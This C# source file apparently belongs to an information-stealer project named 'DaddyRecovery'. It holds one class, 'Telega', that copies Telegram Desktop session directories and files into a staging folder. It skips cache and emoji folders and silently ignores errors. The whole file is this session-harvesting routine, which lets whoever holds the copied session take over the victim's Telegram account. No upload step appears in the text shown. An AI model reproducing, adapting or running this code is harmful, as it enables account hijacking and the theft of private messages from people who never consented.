namespace DaddyRecovery.Applications
{
    using System;
    using System.IO;
    using System.Linq;
    using System.Text;
    using DaddyRecovery.Helpers;

    public static class Telega
    {
        public static void GetSession(string From, string To, string Exp)
        {
            if (CombineEx.ExistsDir(From))
            {
                CombineEx.CreateOrDeleteDirectoryEx(true, To, FileAttributes.Normal);
                try
                {
                    foreach (var dirPath in from string dirPath in Directory.EnumerateDirectories(From, Exp, SearchOption.TopDirectoryOnly)
                                            where !dirPath.Contains("dumps") && (!dirPath.Contains("temp")) && (!dirPath.Contains("user_data")) && (!dirPath.Contains("emoji")) && (!dirPath.Contains("tdummy"))
                                            select dirPath)
                    {
                        CombineEx.CreateOrDeleteDirectoryEx(true, dirPath?.Replace(From, To), FileAttributes.Normal);
                        foreach (string newPath in Directory.EnumerateFiles(dirPath, Exp, SearchOption.TopDirectoryOnly))
                        {
                            CombineEx.FileCopy(newPath, newPath?.Replace(From, To), true);
                        }
                    }
                }
                catch (Exception) { }
            }
        }
    }
}